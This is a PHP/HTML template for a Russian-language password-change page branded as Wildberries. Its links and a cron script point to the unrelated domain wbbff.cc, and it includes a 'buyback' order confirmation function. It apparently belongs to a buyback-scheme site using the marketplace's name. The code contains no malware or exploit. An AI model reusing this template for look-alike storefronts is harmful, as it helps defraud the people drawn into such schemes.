<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" class="pixel-ratio-2 retina"><head><style>:root {

--image-path: url('<?php echo asset("/assets/foot_nav.png")?>');
--image-path2: url('<?php echo asset("/assets/dd_icon.png")?>');
}</style>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
<title>изменить войти пароль - Wildberries</title>
<meta name="keywords" content="Платформа обратного выкупа для российских торговцев">
<meta name="description" content="Коллекции женской, мужской и детской одежды, обуви, а также товары для дома и спорта. Информация о доставке и оплате. Таблицы размеров, советы по уходу за вещами.">
<meta name="format-detection" content="telephone=no">
<link rel="shortcut icon" type="image/ico" href="https://wbbff.cc/favicon.ico">
<link type="text/css" rel="stylesheet" href="<?php echo asset("assets/style.css")?>">
<script type="text/javascript" src="<?php echo asset("assets/jquery.js")?>"></script>
<script type="text/javascript" src="<?php echo asset("assets/global.js")?>"></script>
<script type="text/javascript" src="<?php echo asset("assets/arttpl.js")?>"></script>
<link href="<?php echo asset("assets/layer.css")?>" type="text/css" rel="styleSheet" id="layermcss"></head>
<body><div class="pagetop">
	<div class="fh"><a href="<?php echo route("settings") ?>"></a></div>
	<div>изменить войти пароль</div>
		<!-- <div class="cd"><a href="javascript:top_menu();"></a></div> -->
	<!-- 
<div class="top_menu" id="top_menu">
	<ul>
	<li><a href="<?php  echo route("index") ?>"><i class="top_tb1"></i><span>Главная</span></a></li>
	<li><a href="https://wbbff.cc/index.php/category/list"><i class="top_tb2"></i><span>Каталог</span></a></li>
	<li><a href="<?php  echo route("cart") ?>"><i class="top_tb3"></i><span>Корзина</span></a></li>
	<li><a href="<?php  echo route("profile") ?>"><i class="top_tb4"></i><span>Профиль</span></a></li>
	</ul>
	<div class="clear"></div>
</div> --></div>
<div class="main">
	<form method="post" id="form">
	<div class="zc_box2">
				<div class="zc_list">
			<div class="zc_name">шаг 1</div>
			<div class="zc_text"><input type="password" name="user_oldpw" placeholder="Текущий пароль"></div>
		</div>
				<div class="zc_list">
			<div class="zc_name">шаг 2</div>
			<div class="zc_text"><input type="password" name="user_pw" placeholder="Новый пароль"></div>
		</div>
		<div class="zc_list">
			<div class="zc_name">шаг 3</div>
			<div class="zc_text"><input type="password" name="user_pw1" placeholder="Подтвердите новый пароль"></div>
		</div>
	</div>
	<div class="loginbtn" style="margin:20px 10px;">
		<input type="hidden" name="pe_token" value="75236c7c5fdf7ebfe3441c02863d0cb8">
		<input type="hidden" name="pesubmit">
		<input type="button" value="OK">
	</div>
	</form>
</div>
<script type="text/javascript">
$(function(){
	$(":button").click(function(){
		if ($(":input[name='user_oldpw']").val().length == 0) {
			app_tip("Введите старый пароль");
			return false;
		}
		if ($(":input[name='user_pw']").val().length < 6 || $(":input[name='user_pw']").val().length > 20) {
			app_tip("Новый пароль должен состоять из 6-20 символов.");
			return false;
		}
		if ($(":input[name='user_pw1']").val().length < 6 || $(":input[name='user_pw1']").val().length > 20) {
			app_tip("");
			return false;
		}
		if ($(":input[name='user_pw']").val() != $(":input[name='user_pw1']").val()) {
			app_tip("Новый пароль не соответствует подтвержденному паролю.");
			return false;
		}
		app_submit("<?php echo route("api.profile.change_password")?>", function(json){
			if (json.result) app_open('user.php?mod=setting&act=base', 1000);
		});
	})
})
</script>
<link rel="stylesheet" href="<?php echo asset("assets/weui.min.css")?>">
<link rel="stylesheet" href="<?php echo asset("assets/jquery-weui.min.css")?>">
<script src="<?php echo asset("assets/jquery-weui.js")?>"></script>
<script type="text/javascript" src="<?php echo asset("assets/layer.js")?>"></script>
<script type="text/javascript" src="<?php echo asset("assets/app.js")?>"></script>
<script type="text/javascript">
//顶部菜单点击
function top_menu() {
	if ($("#top_menu").is(":hidden")) {
		$("#top_menu").show();
	}
	else {
		$("#top_menu").hide();	
	}
	$("#top_menu a").live("click", function(){
		$("#top_menu").hide();
	})
}
pe_loadscript("https://wbbff.cc/api.php?mod=cron");
</script>
<script>
function confirm_huigou(order_id){
    layer.open({
		content: "Определить выкуп этого Заказ？",
		btn: ["OK", "Отмена"],
		shadeClose: false,
		yes: function() {
		    
			/*layer.open({
				content: '你点了确认',
				time: 1
			});*/
			$.ajax({
                type:"POST",
                url:"./user.php?mod=order&act=huigou_do",
                dataType:"json",
                data:{
                    'order_id':order_id,
                },
                success:function(res){
                    console.log(res);

                    if (res.result == false) {
	                    layer.open({
	    						content: res.msg,
	    						time: 3,
	    						skin: 'msg',
	    						end: function () { 
								location.href='./user.php?mod=userbank';
	    						}
	    					});
                    }else{
	                    layer.open({
	    						content: res.msg,
	    						time: 2,
	    						skin: 'msg',
	    						end: function () { 
									location.reload();
	    						}
	    					});
                    }
                }
            });
		}

	});
}    
</script>

</body></html>